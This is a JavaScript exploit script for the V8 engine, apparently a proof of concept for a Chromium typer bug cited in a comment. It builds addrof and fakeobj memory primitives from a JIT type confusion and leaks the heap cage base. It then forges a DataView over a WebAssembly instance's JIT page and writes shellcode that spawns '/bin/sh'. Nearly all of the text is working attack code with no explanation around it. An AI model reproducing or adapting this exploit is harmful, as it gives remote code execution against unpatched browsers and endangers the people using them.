var wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);

function template(snippet) {
  return `function f(a, obj) {
    // Copied from https://crbug.com/1234770
    let o = {c0: 0, cf: false};
    let x = ((a&5)==2)|0;
    let y = ((a&6)==1)|0;
    
    "a"[x];"a"[y]; // generate CheckBounds()
  
    x = x + (o.cf ? "" : (2**30) - (o.c0&1)) - (2**30); // type is Range(-1,0), but only after LoadElimination
    y = y + (o.cf ? "" : (2**30) - (o.c0&1)) - (2**30);
    
    x = Math.min(2**32-1, x + (2**32-1)) - (2**32-1); // type is Range(-1,0) already during Typer
    y = Math.min(2**32-1, y + (2**32-1)) - (2**32-1);
    let confused = Math.max(-1,x & y); // type is Range(..., 0), really is 1
    confused = Math.max(-1, confused); // type is Range(-1, 0), really is 1
    confused = ((0-confused)>>31); // type is Range(0, 0), really is -1
    confused = -confused | 0; // Range(0, 0) but 1
  
    ${snippet}
  }`;
}

function addrof(obj) {
  eval(template(`
    // Typer hardening bypass
    var arr = [1.1, 1.1, 1.1, 1.1];
    var arr2 = [obj, obj, obj, obj, obj, obj, obj, obj, obj, obj];

    // arr[8] points arr2[0]
    return [
      arr.at((confused << 3) | 0),
      arr2.at(a) // prevent arr2 being optimized out
    ];
  `))
  for (var i = 0; i < 1e5; i++) f(0, obj);
  f64[0] = f(3, obj)[0];
  return u32[0];
}

function fakeobj(addr) {
  addr = ii2f(addr, 0x41414140);
  addr = addr.toPrecision(100);
  eval(template(`
    // Typer hardening bypass
    var arr = [,,,,,,,];
    var arr2 = [${addr}, ${addr}, ${addr}, ${addr}, 1.1];
    return arr.at((confused << 3) | 4);
  `))
  for (var i = 0; i < 1e5; i++) f(0);
  return f(3);
}

var ab = new ArrayBuffer(8);
var f64 = new Float64Array(ab);
var u32 = new Uint32Array(ab);

function i2f(i) {
  return ii2f(i, i / 0x100000000 | 0);
}

function ii2f(a, b) {
  u32[0] = a;
  u32[1] = b;
  return f64[0];
}

var obj = {
  map: 0,
  prop: 0,
  elem: 2, // heap base, leaking the compressed pointer base

  // JSArrayBuffer fields
  a: 0x40, // byte length
  b: 0x40,
  c: 0,
  d: 0,
  e: 0,
  f: 0,
};
var addr = addrof(obj);

// Should be the same
% DebugPrint(obj);
print(addr.toString(16));

// Should return 0x2121 (smi)
var r = fakeobj(0x4242);
print(r.toString(16));

// Leaking the full address
var r = fakeobj(addr + 0xc);
var cage = (r[4] >> 7) * 0x100000000;
print(cage.toString(16) + addr.toString(16).padStart(8, '0'));

// Exploit
{
  var addr_wasm = addrof(wasm_instance);
  print('wasm at', addr_wasm.toString(16));

  // Make fake object `r` a JSArrayBuffer
  obj.map = ii2f(0, 0x80d);

  // Then construct a fake DataView (backing store = 0x0)
  var dv = new DataView(r);

  // Modify DataView backing pointer to jit address
  var jit = dv.getBigUint64(addr_wasm + 0x60 - 1, true);
  print('JIT address', jit.toString(16));
  dv.setBigUint64(addrof(dv) + 0x10 - 1, BigInt(0x10000000000000000 - cage) + jit, true);

  // execve("/bin/sh")
  var sh = [0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x52, 0x53, 0x54, 0x5f, 0x52, 0x57, 0x54, 0x5e, 0x0f, 0x05];
  for (var i = 0; i < sh.length; i++) {
    dv.setUint8(i, sh[i]);
  }
  wasm_instance.exports.main();
}